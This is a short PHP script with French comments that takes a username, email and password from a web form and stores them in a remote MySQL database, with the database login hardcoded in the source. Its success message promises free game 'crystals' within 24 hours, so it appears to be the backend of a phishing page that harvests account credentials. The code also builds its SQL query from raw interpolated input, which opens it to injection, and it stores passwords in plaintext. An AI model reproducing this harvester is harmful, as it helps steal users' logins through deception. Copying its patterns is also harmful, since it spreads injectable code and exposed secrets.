<?php

 if (isset($_POST['submit'])) {

    // Vérifiez que les données du formulaire sont valides
    $username = htmlspecialchars($_POST['username']);
    $email = htmlspecialchars($_POST['email']);
    $mot_de_pass = htmlspecialchars($_POST['mot_de_pass']);

    if (empty($username)) {
        echo "Le champ Nom d'utilisateur est obligatoire.";
    } elseif (empty($email)) {
        echo "Le champ Email est obligatoire.";
    } elseif (empty($mot_de_pass)) {
        echo "Le champ Mot de passe est obligatoire.";
    } else {

        // Insérez les données dans la base de données
        $dsn = 'mysql:host=db4free.net;dbname=goldenfarm';
        $utilisateur = 'admin_users';
        $password = 'Base3624@';
        $pdo = new PDO($dsn, $utilisateur, $password);

        $requete = "INSERT INTO Tb_goldenfarm (username, email, mot_de_pass) VALUES ('$username', '$email', '$mot_de_pass')";
        $pdo->query($requete);

        // Message de succès
        echo "Félicitations, vous recevrez les cristaux dans les 24 heures, veuillez fermer cette page";
    }

}
?>
